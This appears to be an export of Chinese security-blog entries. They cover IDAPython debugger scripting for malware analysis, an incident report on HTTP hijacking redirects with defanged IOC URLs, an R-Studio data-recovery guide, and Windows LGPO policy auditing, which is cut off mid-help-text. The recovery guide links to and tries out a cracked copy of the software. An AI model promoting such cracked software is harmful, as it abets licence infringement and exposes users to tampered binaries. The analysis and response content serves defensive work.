你可以使用调试器脚本来自动完成与恶意软件分析有关的常规任务。在上一章中，我们看了使用IDAPython进行静态代码分析的例子。在本节中，你将学习如何使用IDAPython来执行调试相关任务。本节演示的IDAPython脚本使用了新的IDAPython API，这意味着，如果你使用旧版本的IDA（低于IDA 7.0），这些脚本将无法工作。\n下面的资源应该可以帮助你开始使用IDAPython调试器的脚本。这些资源中的大部分（除了IDAPython文档）都是使用旧的IDAPython API来演示脚本功能的，但它们应该足以让你明白这个道理。任何时候你遇到困难，你都可以参考IDAPython文档。\nIDAPython API文档：https://www.hex-rays.com/products/ida/ support/idapython_docs/idc-module.html Magic Lantern Wiki: http://magiclantern.wikia.com/wiki/IDAPython IDA脚本调试器：https://www.hex-rays.com/products/ida/debugger/scriptable.shtml 使用IDAPython使你的生活更轻松（系列）：https://researchcenter.paloaltonetworks.com/2015/12/using-idapython-to-make-your-life-easierpart-1/ 本节将让你感受到如何使用IDAPython进行调试相关的工作。首先，在IDA中加载可执行文件，并选择调试器（通过调试器|选择调试器）。为了测试下面的脚本命令，选择了本地Windows调试器。可执行文件加载完毕后，你可以在IDA的Python shell中执行下面提到的Python代码片段，或者选择文件|脚本命令（Shift + F2），并选择脚本语言为Python（从下拉菜单）。如果你希望以独立脚本的形式运行，你可能需要导入相应的模块（例如，导入idc）。\n下面的代码片段在当前光标位置设置一个断点，启动调试器，等待暂停调试器事件发生，然后打印出与断点地址相关的地址和反汇编文本。\nidc.add_bpt(idc.get_screen_ea()) idc.start_process('', '', '') evt_code = idc.wait_for_next_event(WFNE_SUSP, -1) if (evt_code \u003e 0) and (evt_code !=idc.PROCESS_EXITED): evt_ea = idc.get_event_ea() print \"Breakpoint Triggered at:\", hex(evt_ea),idc.generate_disasm_line(evt_ea, 0)以下是执行前述脚本后产生的输出结果命令。\nBreakpoint Triggered at: 0x1171010 push ebp下面的代码片断步入下一条指令，并打印出地址和反汇编文本。以同样的方式，你可以使用idc.step_over()来步入指令。\nidc.step_into() evt_code = idc.wait_for_next_event(WFNE_SUSP, -1) if (evt_code \u003e 0) and (evt_code !=idc.PROCESS_EXITED): evt_ea = idc.get_event_ea() print \"Stepped Into:\", hex(evt_ea),idc.generate_disasm_line(evt_ea, 0)执行前面的脚本命令的结果显示在这里。\nStepped Into: 0x1171011 mov ebp,esp要获得一个寄存器的值，你可以使用 idc.get_reg_value() 。下面的例子 获取esp寄存器的值并在输出窗口中打印出来。\nPython\u003eesp_value = idc.get_reg_value(\"esp\") Python\u003eprint hex(esp_value) 0x1bf950要获得地址为0x14fb04的dword值，请使用以下代码。以 同样，你可以使用idc.read_dbg_byte(ea), idc.read_dbg_word(ea), 和idc.read_dbg_qword(ea)来获取特定地址的字节、字和qword值。 地址的字节、字和q字值。\nPython\u003eea = 0x14fb04 print hex(idc.read_dbg_dword(ea)) 0x14fb54要获得地址为0x01373000的ASCII字符串，使用以下方法。默认情况下，idc.get_strlit_contents()函数会得到指定地址的ASCII字符串。\nPython\u003eea = 0x01373000 Python\u003eprint idc.get_strlit_contents(ea) This is a simple program为了获得UNICODE字符串，你可以使用idc.get_strlit_contents()函数，将其strtype参数设置为常量值idc.STRTYPE_C_16，如下所示。你可以在idc.idc文件中找到定义的常量值，该文件位于你的IDA安装目录中。\nPython\u003eea = 0x00C37860 Python\u003eprint idc.get_strlit_contents(ea, strtype=idc.STRTYPE_C_16) SHAMple.dat下面的代码列出了所有加载的模块（可执行文件和DLLs）以及它们的基础地址。\nimport idautils for m in idautils.Modules(): print \"0x%08x %s\" % (m.base, m.name)执行前面的脚本命令的结果显示在这里。\n0x00400000 C:\\malware\\5340.exe 0x735c0000 C:\\Windows\\SYSTEM32\\wow64cpu.dll 0x735d0000 C:\\Windows\\SYSTEM32\\wow64win.dll 0x73630000 C:\\Windows\\SYSTEM32\\wow64.dll 0x749e0000 C:\\Windows\\syswow64\\cryptbase.dll [REMOVED]要获得kernel32.dll中CreateFileA函数的地址，使用以下代码。\nPython\u003eea = idc.get_name_ea_simple(\"kernel32_CreateFileA\") Python\u003eprint hex(ea) 0x768a53c6要恢复一个暂停的进程，你可以使用以下代码。\nPython\u003eidc.resume_process()3.9.1 确定恶意软件所访问的文件的例子 在上一章，在讨论IDAPython时，我们写了一个IDAPython脚本来确定CreateFileA函数的所有交叉引用（CreateFileA被调用的地址）。在本节中，让我们加强该脚本，以执行调试任务，并确定由恶意软件创建（或打开）的文件的名称。\n下面的脚本在程序中调用CreateFileA的所有地址上设置一个断点，并运行恶意软件。在运行以下脚本之前，选择适当的调试器（调试器|选择调试器|本地Windows调试器）。当这个脚本被执行时，它在每个断点（换句话说，在调用CreateFileA之前）暂停，并打印出第一个参数（lpFileName）、第二个参数（dwDesiredAccess）和第五个参数（dwCreationDisposition）。这些参数将给我们提供文件的名称，一个代表对文件进行操作的常量值（如读/写），以及另一个常量值，表示将进行的操作（如创建或打开）。当触发断点时，第一个参数可以在[esp]处访问，第二个参数在[esp+0x4]处，第五个参数在[esp+0x10]处。除了打印一些参数外，脚本还通过在步入CreateFile函数后检索EAX寄存器的值来确定文件的句柄（返回值）。\nimport idc import idautils import idaapi ea = idc.get_name_ea_simple(\"CreateFileA\") if ea == idaapi.BADADDR: print \"Unable to locate CreateFileA\" else: for ref in idautils.CodeRefsTo(ea, 1): idc.add_bpt(ref) idc.start_process('', '', '') while True: event_code = idc.wait_for_next_event(idc.WFNE_SUSP, -1) if event_code \u003c 1 or event_code == idc.PROCESS_EXITED: break evt_ea = idc.get_event_ea() print \"0x%x %s\" % (evt_ea, idc.generate_disasm_line(evt_ea,0)) esp_value = idc.get_reg_value(\"ESP\") dword = idc.read_dbg_dword(esp_value) print \"\\tFilename:\", idc.get_strlit_contents(dword) print \"\\tDesiredAccess: 0x%x\" % idc.read_dbg_dword(esp_value + 4) print \"\\tCreationDisposition:\",hex(idc.read_dbg_dword(esp_value+0x10)) idc.step_over() evt_code =idc.wait_for_next_event(idc.WFNE_SUSP, -1) if evt_code == idc.BREAKPOINT: print \"\\tHandle(return value): 0x%x\" %idc.get_reg_value(\"EAX\") idc.resume_process()下面是执行前述脚本的结果。DesiredAccess值，0x40000000和0x80000000，分别代表GENERIC_WRITE和GENERIC_READ操作。createDisposition值，0x2和0x3，分别表示CREATE_ALWAYS（总是创建一个新文件）和OPEN_EXISTING（打开一个文件，只有当它存在时）。正如你所看到的，通过使用调试器脚本，可以快速确定恶意软件创建/访问的文件名。\n0x4013fb call ds:CreateFileA Filename: ka4a8213.log DesiredAccess: 0x40000000 CreationDisposition: 0x2 Handle(return value): 0x50 0x401161 call ds:CreateFileA Filename: ka4a8213.log DesiredAccess: 0x80000000 CreationDisposition: 0x3 Handle(return value): 0x50 0x4011aa call ds:CreateFileA Filename: C:\\Users\\test\\AppData\\Roaming\\Microsoft\\winlogdate.exe DesiredAccess: 0x40000000 CreationDisposition: 0x2 Handle(return value): 0x54 ----------------[Removed]------------------------4. 调试一个.NET应用程序 在进行恶意软件分析时，你将不得不处理分析各种各样的代码。你可能会遇到使用微软Visual C/C++、Delphi和.NET框架创建的恶意软件。在本节中，我们将简要介绍一个名为dnSpy（https:// github.com/0xd4d/dnSpy）的工具，它使分析.NET二进制文件更加容易。当涉及到反编译和调试.NET应用程序时，它是相当有效的。要加载一个.NET应用程序，你可以将应用程序拖放到dnSpy中，或者启动dnSpy并选择文件|打开，给它二进制文件的路径。一旦加载了.NET应用程序，dnSpy就会对该程序进行反编译，你可以在左侧的窗口（名为Assembly explorer）中访问该程序的方法和类。下面的截图显示了反编译后的.NET恶意二进制文件（名为SQLite.exe）的主要功能。\n一旦二进制文件被反编译，你可以阅读代码（静态代码分析），以确定恶意软件的功能，或调试代码并执行动态代码分析。要调试恶意软件，你可以点击工具栏上的 “开始 “按钮，或选择 “调试”|“调试汇编”（F5）；这将弹出如图所示的对话框。\n使用Break at下拉选项，您可以指定调试器启动时的中断位置。一旦您对这些选项满意，您可以点击确定，这将在调试器的控制下启动进程，并在入口处暂停调试器。现在，您可以通过Debug菜单访问各种调试器选项（如Step Over, Step into, Continue等），如下图所示。你也可以通过双击某一行来设置断点，或者选择Debug | Toggle Breakpoint（F9）。当你调试时，你可以利用本地窗口来检查一些本地变量或内存位置。\n为了了解.NET二进制分析，以及对前面提到的二进制文件（名为SQLite.exe）的详细分析，你可以阅读作者的博文：https://cysinfo.com/cyber-attack-targetingcbi-and-possibly-indian-army-officials/。\n摘要 本章所涉及的调试技术是了解恶意二进制文件内部运作的有效方法。恶意二进制文件的内部工作原理。代码分析工具所提供的调试功能 诸如IDA、x64dbg和dnSpy等代码分析工具所提供的调试功能可以大大增强你的逆向工程进程。工程过程。在恶意软件分析过程中，你通常会结合反汇编 和调试技术来确定恶意软件的功能，并从恶意二进制文件中获得有价值的 从恶意二进制文件中获得有价值的信息。\n在下一章中，我们将使用迄今为止学到的技能来了解各种恶意软件的特点和功能。\n",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析-7-调试恶意软件二进制文件",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-7-%E8%B0%83%E8%AF%95%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/index.html"
  },
  {
    "content": "近期的一个应急中我们注意到某客户web应用每隔一段时间移动端UA访问会发生跳转现象, 但是并非传统的篡改情况比较特殊, 这里特殊记录下.\n—more—\n首先我们复现页面篡改安全事件的现象, 观察页面篡改的实际情况: 访问某页面, http://xxx/xx 偶尔会跳转到 https[://]1121[.]24368212[.]top/1106/pandash https[://]98vv[.]vip/ , 经确认访问后的特点除了以下几个返回内容之外, 同时header存在max-age=0, 触发方式不固定, 而将UA修改为移动端或切换移动端UA访问会有一定几率触发跳转.\n跳转情况1:\n使用top.location.href=“xxx”, 在样式顶层进行跳转, 可以在iframe外进行跳转.\n跳转情况2:\n通过分析可以看到跳转的连接为 https[://]98vv[.]vip/ 跳转情况3:\n也是使用了top.location.href=“xxx”, 使用的不同的地址跳转.\n由于每次跳转触发不固定, 因此复现的时候也花了一会时间, 这里看到返回包的js我们可以知道确实是通常相关黑灰产使用的js跳转方式. 可以注意到这里使用了top.location.href的方式, 这种方式可以在iframe之外进行跳转.\n通常的页面篡改, 到这里我们看到的现象是访问不论是页面还是js都会发生跳转, 首要目的我们会思考是否页面中被插入的js导致返回的内容受控跳转. 这里我们针对三种情况的关键词都在系统中进行全文查找内容, 结果并没有发现相关内容.\n接着我们查看相关的页面和js内容, 结果都没有发现可疑的脚本.\n这里只在文件内容中发现了一些max-age=0的页面.\n我们查看下中间件的配置, 发现中间件配置也没有发现问题\n到此为止我们发现与传统的跳转方式都不同, 与中间件控制的跳转方式也不同. 因此这里考虑到是否存在劫持. 首先dns劫持, 经过排查发现不论是多地多运营商解析域名、还是通过dnslookup都没有看到域名解析异常情况, 由于客户的域名是阿里的域名, 使用修改本地的dns为223.5.5.5以及223.6.6.6再访问还是有问题. 但ip在以上情形下都无变化, 因此判断不是dns劫持情况.\n最后我们排出了系统异常登录、ssh密钥登录等情况判断可能是流量劫持问题. 与阿里同事的客服的判断相同.\n最后我们给出了我们的最终的排查或解决方案,\n建议https防止运营商拆包加内容\n建议dns在域名解析上进行检测\n建议和运营商反馈情况排查问题\nmax-age=0尝试改max-age=-1\n第二天客户反馈, 采用https+反馈运营商, 问题解决.\n至此整个跳转情况结束.\nIOCs: https[://]1121[.]24368212[.]top/1106/pandash https[://]98vv[.]vip/\n",
    "description": "",
    "tags": "红蓝对抗,页面篡改",
    "title": "页面篡改分析-http流量劫持页面篡分析",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-http%E5%8A%AB%E6%8C%81%E8%B7%B3%E8%BD%AC/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "0x02电子取证",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "3文件恢复",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/index.html"
  },
  {
    "content": "近期在应急数据恢复场景，客户使用Hyper-V运行业务系统，由于没有设置快照，在误操作下恢复了虚拟机，导致数据丢失，因此客户需求需要将数据恢复。用过很多方式最后这个好用，这里作为记录归档。\nR-studio network官网https://www.r-studio.com/\n破解版：https://www.52pojie.cn/forum.php?mod=viewthread\u0026tid=1431679\u0026highlight=R-studio%2Bnetwork\n软件使用 使用R-STUDIO查找删除的文件 这里使用的是parallels虚拟机环境，对win10虚拟机进行的文件恢复扫描。\n可以看到扫描结束，整个60G扫描用了2分钟。\n查看发现的文件，基本上和DS、360数据恢复类似的操作，根据需要选择恢复即可，恢复机会代表一定的准确性，可以尝试恢复想恢复的文件。\n最后这里尝试使用破解版的远程恢复功能，这里有个前情，下面的软件介绍里也可以看到，正版软件原则是带有agent放在被恢复主机中的，agent部署需要序列号，但是我们下载的破解版没有agent，但是看到有等待从远程计算机链接的功能。那么我们有没有可能host和远程主机都打开RSTUDIO，host选择指定IP连接，远程主机选择监听，实现host到远程主机的连接？\n测试发现未成功，所以这个远程恢复功能还有待发掘。\n软件介绍 1.采用Windows资源管理器操作界面；通过网络恢复远程数据（远程计算机可运行Win95/98/ME/NT/2000/XP、Linux、UNIX系统） 2.支持FAT12/16/32、NTFS、NTFS5和Ext2FS文件系统；能够重建损毁的RAID阵列；为磁盘、分区、目录生成镜像文件 3.恢复删除分区上的文件、加密文件（NTFS5）、数据流（NTFS、NTFS5） 4.恢复FDISK或其它磁盘工具删除过得数据、病毒破坏的数据、MBR破坏后的数据 5.识别特定文件名；把数据保存到任何磁盘；浏览、编辑文件或磁盘内容等等！\n通过网络进行数据恢复是 R-Studio 最强大、最有用的功能之一。通常，数据恢复需要物理移除硬件或本地安装已注册的数据恢复软件包。使用 R-Studio 网络数据恢复，您可以放弃这两个要求。使用安装了 R-Studio 的本地计算机和安装了 R-Studio Agent 的远程计算机，您可以通过网络连接在目标计算机上执行完整的数据恢复。\n这两个程序通过任何网络连接进行交互——无论是全球公司网络、小型局域网，还是直接连接两台计算机的以太网电缆。连接后，可以恢复来自远程计算机的数据，就像磁盘直接连接到本地计算机一样。您可以在远程计算机上执行文件恢复、磁盘映像，甚至数据编辑。大文件数据集的处理可以完全在远程计算机上完成，无需通过网络传输。例如，可以将恢复的文件和磁盘映像保存到远程计算机的磁盘上，而无需将它们传输到本地计算机。\nR-Studio 网络软件包专为在企业环境中频繁使用网络数据恢复功能集而设计。但是在演示版中可以使用某种程度的网络数据恢复功能，并且也可以使用单个 R-Studio 许可证。升级到 R-Studio Network 许可证的价值取决于您的特定需求。\n通过网络进行数据恢复在以下情况下最有效：\n当计算机位于远程或难以访问的地方，并且访问其文件的唯一方法是通过网络连接到它时。\n当本地计算机具有不常见的硬件或软件配置，并且很难或不可能在本地安装 R-Studio 或使用 R-Studio Emergency 时。\n当很难或不可能从计算机中取出磁盘并将其直接连接到安装了 R-Studio 的计算机时。\n在所有情况下，目标计算机的硬件都应该是可操作的，并且操作系统应该可以正常运行且可启动。如果计算机无法启动，但硬件未损坏，则可以使用 R-Studio Agent Emergency。R-Studio Agent Emergency 允许您访问无法启动计算机的硬盘，前提是没有潜在的物理硬件问题。有关在无法启动的计算机上执行网络数据恢复的更多信息，请参阅我们的文章“通过网络进行紧急数据恢复”。; （对于本地紧急恢复，请阅读我们的文章“使用 R-Studio Emergency 进行紧急文件恢复”）。\n充分利用您的 R-Studio 许可 R-Studio 和 R-Studio Agent 提供多种不同的许可包：R-Studio、R-Studio Network 和 R-Studio Technician。这些软件包旨在为您提供适当数量的 R-Studio 许可证，同时保持经济实惠。对于任何 R-Studio 软件包，如果您决定稍后升级，您可以将初始许可费用用于 R-Studio 网络或 R-Studio 技术人员许可。\nR-Studio 和 R-Studio Agent 可用于所有主要操作系统：Windows、Mac OS X 和 Linux。无论安装的操作系统如何，R-Studio Agent Emergency 都在预引导环境中工作。\n创建图像文件 扫描磁盘和预览文件 保存恢复的文件 网络数据恢复 可转让许可和商业用途 R-Studio 演示版 是的 是的 不 不 不 R-Studio（单一许可证） 是的 是的 是的 不 不 R-Studio 网络 是的 是的 是的 是的 不 R-Studio 技术员 是的 是的 是的 是的 是的 R-STUDIO 基本且最实惠的 R-Studio 软件包用于 R-Studio 的单个本地副本。\n独立的 R-Studio 许可证对于家庭用户、一次性数据恢复方案或小型企业来说最具有经济意义。通常，购买单个 R-Studio 许可证以在一台机器上执行本地数据恢复操作。但如果与演示版 R-Studio Agent 结合使用，即使您没有购买 R-Studio 网络许可证，您也可以通过网络执行数据恢复。\n在演示模式下，R-Studio 和 R-Studio Agent 都允许您执行所有数据恢复操作；唯一的限制是不能通过网络保存超过 256KB 的文件。要执行完整的数据恢复，您可以将注册的 R-Studio 副本与安装在远程计算机上的演示版 R-Studio Agent 结合使用。使用 R-Studio，您可以在演示模式下连接到运行 R-Studio Agent 的远程计算机，并创建远程计算机的磁盘映像并将其保存到连接到远程计算机的外部驱动器。然后，您可以将磁盘映像传输到安装了 R-Studio 注册副本的计算机，并对磁盘映像执行完整的数据恢复。\n虽然这不是真正的网络数据恢复，但这将允许您从联网计算机恢复数据，而无需购买 R-Studio 网络许可证。尽管创建和传输磁盘映像不如通过网络恢复文件方便，但这种方法对于偶尔或孤立的数据恢复方案来说已经足够了。\n请注意，单个 R-Studio 许可证不允许您使用此方法执行商业数据恢复服务。您只能将 R-Studio 用于您自己的家庭或企业。\nR-STUDIO NETWORK R-Studio Network 许可包在公司或企业环境中最为有用。首先，企业级IT系统的计算机和服务器较多，因此数据丢失的风险较高。其次，较大的公司通常拥有具有不常见硬件配置或服务协议的计算机和系统，这使得在技术或逻辑上难以访问机箱内的硬盘驱动器。第三，企业 IT 部门经常管理多个地理位置的计算机，远程办公地点的计算机可能需要数据恢复。\n这些因素相结合，证明对 R-Studio 网络许可证进行额外投资是合理的。R-Studio Network 允许您在发生数据丢失之前制定数据恢复策略，并允许您快速有效地响应每个事件，同时最大限度地减少（或消除）站点到站点的旅行量。\n使用 R-Studio 网络包，除了 R-Studio 的许可证之外，您还可以获得 R-Studio Agent 或 R-Studio Agent Emergency 的五个许可证。R-Studio Agent 和 R-Studio Agent Emergency 许可证不可在机器之间转让。当您在计算机上注册 R-Studio Agent 的副本时，它会绑定到该设备 - 您无法在恢复数据后从该机器卸载它，然后将其安装在另一台机器上。但是，您可以在同一台机器上的 R-Studio Agent、R-Studio Agent Portable 和 R-Studio Agent Emergency 之间传输许可证。例如，您可以在无法启动的机器上临时使用 R-Studio Emergency，然后在该机器再次运行时在该机器上安装 R-Studio Agent 的注册副本。\n使用五个许可证的最有效方法是在网络上最关键的计算机上预安装 R-Studio Agent。物理或地理上难以访问或具有独特硬件配置的计算机是预安装 R-Studio Agent 副本的理想选择。这使您可以在机器上执行完整的网络数据恢复，而无需在其上安装新软件，否则可能会覆盖未恢复的数据。\n剩余的许可证可以根据需要保留用于部署在设备上，或者安装在指定用于网络上数据恢复的计算机上。可以使用 R-Studio 的未注册副本对目标计算机进行映像，然后可以使用另一台计算机上的注册副本分析和恢复数据。\n以下是如何部署 R-Studio 网络许可证的两个示例：\n示例 1. 公司网络中的服务器和计算机。 例如，R-Studio 安装在系统管理员工作站上。R-Studio Agent 预装在最关键的服务器上；R-Studio Agent Portable 可用于其余计算机。当发生数据丢失时，R-Studio 会立即连接到必要的计算机，并开始数据恢复过程。无需安装程序、重新启动计算机等。因此，覆盖丢失数据的风险最小。\n在“如何使用R-Studio的网络包”。文章更详细地描述了 R-Studio 如何在企业网络中工作。\n例 2. 从难以访问的计算机进行网络数据恢复（常规和紧急恢复） 在某些情况下，由于无法轻松物理访问硬件，或者计算机可能处于服务状态，因此无法移除计算机的硬盘驱动器PC外壳密封且用户无法访问的协议。R-Studio Agent Portable 可以在目标机器上运行和注册，并且 R-Studio 可以连接到计算机以远程恢复数据，而无需物理访问其硬件。\n请注意，尽管 R-Studio Network 包含更多许可证，但仍可能无法用于为客户执行商业数据恢复服务。R-Studio Network 只能用于您自己的组织。\nR-STUDIO TECHNICIAN R-Studio Technician专为向第三方客户提供服务的专业数据恢复公司而设计。但是，R-Studio 技术员许可证包也有利于内部使用。与 R-Studio Network 不同，R-Studio Technician 许可证可在组织内的计算机之间转移，只要同时安装注册副本的计算机数量不超过购买的许可证数量。这允许您在组织内部或外部的任何机器上临时安装注册副本。如果您为大量计算机提供服务或需要通过 Internet 执行数据恢复，这将特别有用。\n通过网络进行 数据恢复的工作原理 要了解数据恢复网络如何与每个软件包的允许许可一起工作，有助于了解整个过程。\n使用 R-Studio 通过网络恢复数据是一个三步过程：\n在远程计算机上启动和配置 R-Studio Agent。\n通过网络在 R-Studio 和 R-Studio Agent 之间建立连接。\n从远程计算机恢复数据，就像在该计算机上安装了 R-Studio 一样。\n让我们来看看这个过程是如何与 R-Studio/R-Studio Agent 一起工作的。在整个过程中，您可以使用 R-Studio Agent、R-Studio Agent Portable 或 R-Studio Agent Emergency。我们将为每个应用程序提供详细信息。\n1. 在远程计算机上启动并配置 R-Studio Agent。 启动 R-Studio Agent、R-Studio Agent Portable 或 R-Studio Agent Emergency\n如果您使用的是 R-Studio Agent，请执行以下操作：\n在远程计算机上安装并运行 R-Studio Agent。当 R-Studio Agent 启动时，其图标会出现在系统托盘中：\n当 R-Studio Agent 启动时，它首先要求您输入注册号。您可以输入它或单击演示按钮继续。如果您选择演示模式，您可以稍后从安装了 R-Studio 的计算机上输入注册号。\n如果您使用的是 R-Studio Agent Portable，您会将可执行文件复制到闪存设备并在远程计算机上运行。无需安装。如果远程计算机无法启动，请创建 R-Studio Agent 启动盘并使用 R-Studio Agent Emergency 启动您的计算机。（有关更多详细信息，请参阅 R-Studio 帮助：使用 R-Studio Agent 紧急启动盘启动计算机）。\n配置 R-Studio Agent/R-Studio Agent Portable 如果您使用 R-Studio Agent 或 R-Studio Agent Portable： 右键单击 R-Studio Agent 系统托盘图标并选择配置。输入此 R-Studio Agent 的密码和安装 R-Studio 的计算机的 IP 地址： 然后 R-Studio Agent 显示其主面板： 配置 R-Studio Agent Emergency： 如果您使用 R-Studio Agent Emergency，您可能需要输入 IP 地址和网络掩码。 如果您在网络上使用 DHCP，R-Studio Agent Emergency 会自动接收其 IP 地址。您将需要此地址才能将 R-Studio 连接到 R-Studio Agent Emergency。如果没有 DHCP，您必须手动输入 IP 地址和网络掩码。\n2. 通过网络在 R-Studio 和 R-Studio Agent 之间建立连接。 在 R-Studio 主面板上，单击连接到远程按钮。选择网络上运行 R-Studio Agent 的计算机： 如果您要连接到 R-Studio Agent Emergency，您必须在计算机字段中输入该计算机的 IP 地址，将密码字段留空。如果远程计算机上的 R-Studio Agent 在演示模式下运行，则会出现一个对话框，要求您输入 R-Studio Agent 的注册码。您可以输入注册码以访问完整的数据恢复功能集，或单击演示按钮以继续在演示模式下运行 R-Studio Agent。在此模式下，R-Studio 可以执行除实际数据恢复外的任何操作（文件枚举和预览、磁盘扫描等）；恢复的文件无法保存到磁盘。\n当 R-Studio 和 R-Studio Agent 连接时，远程计算机的驱动器和磁盘出现在 R-Studio 驱动器面板上： 注意：如果您将 R-Studio 连接到 R-Studio Agent Emergency，驱动器面板将有不同的外观： 3. 从远程计算机恢复数据，就像在该计算机上安装了 R-Studio 一样。 从 R-Studio 计算机，您可以执行所有硬盘恢复操作，例如文件枚举和文件恢复： 当“恢复”对话框出现时，您可以选择是要将恢复的文件保存在本地还是远程计算机上。通常，您不应将恢复的数据保存到正在从中恢复数据的同一个磁盘上。将新数据写入磁盘可能会在文件恢复之前覆盖文件。但是，如果您有另一个连接到远程计算机的健康磁盘（例如，外部 USB 硬盘驱动器），则将恢复的文件保存到该磁盘会非常有用。将恢复的文件保存到远程计算机上的磁盘可以使您不必通过网络传输大型文件集。它还有助于保护个人信息，因为数据永远不必离开用户的计算机。\n预览文件以估计文件恢复机会： 扫描远程计算机上的磁盘： 查看/编辑对象，在灾难恢复的情况下，例如： 要与远程计算机断开连接，请在“驱动器”面板上选择远程计算机，然后单击“删除”按钮。\n",
    "description": "",
    "tags": null,
    "title": "R-studio network(win)",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/R-studio-networkwin/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "4系统信息收集",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html"
  },
  {
    "content": "安全策略的检测更倾向与合规检测，这里我们希望的是根据合规的标准发现尽可能多的非合规问题。\nWindows安全策略检查 windows官网操作系统技术文件中的有很多关于windows安全信息的内容，组策略安全扩展协议、安全策略、威胁和对策指南、windows安全基线等等。我们在应急场景下不会过在现场进行策略内容的研究，尤其是安全策略有4800条（3000系统安全配置策略、1800是IE的安全配置策略），更多的是需要取相关策略，并与安全基线进行对比核查，找到可能的弱点所在，协助现场安全分析。这里我们可以使用微软官方的策略检测工具LGPO.exe进行策略的导出，然后通过PolicyAnalyzer对策略和基线进行对比分析，最终得到我们想要了解的安全策略上的问题。\nwindows安全基线 有几种获取和使用安全基线的方法：\n可以从 Microsoft 下载中心下载安全基线。 这是 Security Compliance Toolkit (SCT) 的下载页面，其中包含可帮助管理员管理安全基线以及其他基线的各种工具。 安全基线包含在 Security Compliance Toolkit (SCT)中，可从 Microsoft 下载中心进行下载。 SCT 还包含帮助管理员管理安全基线的工具。 还可以获取 对安全基线的支持\nMDM (移动设备管理)安全基线功能，如基于 Microsoft 组策略的安全基线，并且可以轻松地将其集成到现有 MDM 管理工具中。\nMDM 安全基线可以在运行 Microsoft Endpoint Manager 11 的设备上轻松Windows 10配置。 以下文章提供了详细信息步骤：Windows MDM (移动设备) 基线。\n原文可以在Windows 安全基准（https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-security-configuration-framework/windows-security-baselines）找到。\n这里用到的工具有LGPO、PolicyAnalyzer你都可以通过 https://www.microsoft.com/en-us/download/details.aspx?id=55319 进行下载。这个下载链接中的其他内容就是windows基线标准，也建议一起下载，用于后续分析对比基线使用。\nLGPO.exe C:\\Users\\xt\u003eC:\\Users\\xt\\Desktop\\工具\\LGPO.exe LGPO.exe - Local Group Policy Object Utility Version 3.0.2004.13001 Copyright (C) 2015-2020 Microsoft Corporation Security Compliance Toolkit - https://www.microsoft.com/download/details.aspx?id=55319 LGPO.exe has four modes: * Import and apply policy settings; * Export local policy to a GPO backup; * Parse a registry.pol file to \"LGPO text\" format; * Build a registry.pol file from \"LGPO text\". To apply policy settings: LGPO.exe command [...] where \"command\" is one or more of the following (each of which can be repeated): /g path import settings from one or more GPO backups under \"path\" # 从“path”路径下导入一条或多条GPO备份 /p path\\lgpo.PolicyRules import settings from a Policy Analyzer .PolicyRules file # 从Policy Analyzer的.policyrules文件中导入 /m path\\registry.pol import settings from registry.pol into machine config # 从registry.pol导入机器配置 /u path\\registry.pol import settings from registry.pol into user config # 从registry.pol导入用户配置 /ua path\\registry.pol import settings from registry.pol into user config for Administrators # 从registry.pol导入Administrators配置 /un path\\registry.pol import settings from registry.pol into user config for Non-Administrators # 从registry.pol导入非Administrators用户配置 /u:username path\\registry.pol import settings from registry.pol into user config for local user # 从registry.pol导入本地用户配置 /u:username path\\registry.pol specified by \"username\" # 通过用户名指定 /s path\\GptTmpl.inf apply security template # 应用安全模版 /a[c] path\\Audit.csv apply advanced auditing settings; /ac to clear policy first # 应用高级设计设置；/ac 先清理策略再应用 /t path\\lgpo.txt apply registry commands from LGPO text # 从LGPO文本应用注册表命令 /e \u003cname\u003e|\u003cguid\u003e enable GP extension for local policy processing; specify a # 启用本地策略处理的GP扩展;指定一个GUID，或以下名称之一: GUID, or one of these names: * \"zone\" for IE zone mapping extension # \"zone\" 代表IE区域映射扩展 * \"mitigation\" for mitigation options, including font blocking # \"mitigation\" 代表缓解选项，包括字体阻塞 * \"audit\" for advanced audit policy configuration # \"audit\" 代表用于高级审计策略配置 * \"LAPS\" for Local Administrator Password Solution # \"LAPS\" 代表本地管理员密码解决方案 * \"DGVBS\" for Device Guard virtualization-based security # \"DGVBS\" 代表基于虚拟化的安全 * \"DGCI\" for Device Guard code integrity policy # \"DGCI\" 代表设备保护代码完整性策略 /ef path\\backup.xml enable GP extensions referenced in backup.xml from a GPO backup # 从GPO备份中启用backup.xml中引用的GP扩展 /boot reboot after applying policies # 应用策略后重新启动 /v verbose output # 详细输出 /q quiet output (no headers) # 安静输出(没有标头) To create a GPO backup from local policy: # 从本地策略创建GPO备份 LGPO.exe /b path [/n GPO-name] /b path Create GPO backup in \"path\" # 在路径中创建GPO备份 /n GPO-name Optional GPO display name (use quotes if it contains spaces) # 